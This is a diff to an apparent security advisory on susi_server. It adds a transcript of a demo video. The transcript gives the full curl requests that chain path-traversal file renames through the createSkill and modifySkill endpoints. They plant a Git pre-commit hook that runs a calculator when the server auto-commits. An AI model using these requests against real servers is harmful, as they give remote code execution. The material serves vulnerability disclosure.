@@ -20,7 +20,7 @@ Here's an outline of what I'm going to show:
 
 (`susi_server` contains multiple arbitrary file reads, writes, renames, and directory listings and I can't cover all vulnerabilities. This [lgtm.com query](https://lgtm.com/query/7296233609860422014/) shows all instances where user-controlled values are used in paths.)
 
-<video preload="none" controls="controls" width="100%">
+<video preload="none" controls="controls" width="100%" aria-describedby="video-transcript">
 {% for video in site.static_files %}
   {% if video.path contains 'assets/videos/isl-2020-001-fossasia_susi_server_git_hooks_rce.mp4' %}
       <source type="video/mp4" src="{{ video.path }}"></source>
@@ -31,7 +31,50 @@ Here's an outline of what I'm going to show:
 {% endfor %}
   <p>Your browser does not support the video element.</p>
 </video>
+<details id="video-transcript">
+<summary>Video Transcript - Detailed Explanation</summary>
 
+1. In a terminal `bin/start.sh` is executed inside the `susi_server` folder to start the server.
+
+2. In a terminal the following command is executed:
+   ```bash
+   curl -X POST -F 'access_token=[YOUR_ACCESS_TOKEN]' -F 'model=general' \
+   -F 'group=Knowledge' -F 'language=en' -F 'skill=whois' -F 'content=OWNED' \
+   -F 'image=' -F 'image_name=owned' 'http://localhost:4000/cms/createSkill.json'
+   ```
+   This creates the file `susi_skill_data/models/general/Knowledge/en/whois.txt` (`susi_skill_data` is a sibling directory of `susi_server`) with the content `OWNED`.
+
+3. A file manager is opened which shows the existence of the `susi_skill_data/models/general/Knowledge/en/whois.txt` file and also the `susi_skill_data/models/general/Knowledge/en/images/owned` file.
+
+4. In a terminal the following command is executed:
+   ```bash
+   `curl -X POST -F 'access_token=[YOUR_ACCESS_TOKEN]' -F 'imageChanged=false' \
+   -F 'image_name_changed=true' -F 'OldModel=general' -F 'OldGroup=Knowledge' \
+   -F 'OldLanguage=en' -F 'OldSkill=whois' -F 'NewModel=general' \
+   -F 'NewGroup=Knowledge' -F 'NewLanguage=en' -F 'NewSkill=whois' \
+   -F 'content=ANYTHING' -F 'new_image_name=../pre-commit.txt' \
+   -F 'old_image_name=../../../../../../susi_server/src/org/json/JSONException.java' \
+   'http://localhost:4000/cms/modifySkill.json'
+   ```
+   This will change the content of the `whois` skill file from `OWNED` to `ANYTHING`.
+   The file `susi_server/src/org/json/JSONException.java` (this file is executable) is renamed to `susi_skill_data/models/general/Knowledge/en/pre-commit.txt`.
+
+5. In a terminal the following command is executed:
+   ```bash
+   curl -X POST -F 'access_token=[YOUR_ACCESS_TOKEN]' -F 'imageChanged=false' \
+   -F 'image_name_changed=true' -F 'OldModel=general' -F 'OldGroup=Knowledge' \
+   -F 'OldLanguage=en' -F 'OldSkill=pre-commit' -F 'NewModel=general' \
+   -F 'NewGroup=Knowledge' -F 'NewLanguage=en' -F 'NewSkill=pre-commit' \
+   -F $'content=#!/bin/sh\nexec xcalc' \
+   -F 'new_image_name=../../../../../../susi_skill_data/.git/hooks/pre-commit' \
+   -F 'old_image_name=../pre-commit.txt' 'http://localhost:4000/cms/modifySkill.json'
+   ```
+   This will change the content of the `pre-commit` skill file to `#!/bin/sh\nexec xcalc`.
+   The skill file `susi_skill_data/models/general/Knowledge/en/pre-commit.txt` is then moved to `susi_skill_data/.git/hooks/pre-commit`.
+6. A file manager is opened which shows the existence of the `susi_skill_data/.git/hooks/pre-commit` file.
+7. The changes are now automatically commited by `susi_server`.
+This triggers the malicious pre-commit hook we just created. A calculator that pops up can be seen.
+</details>
 
 [LINK TO GIF OF POPPING UP CALC TO-BE-DONE]
 
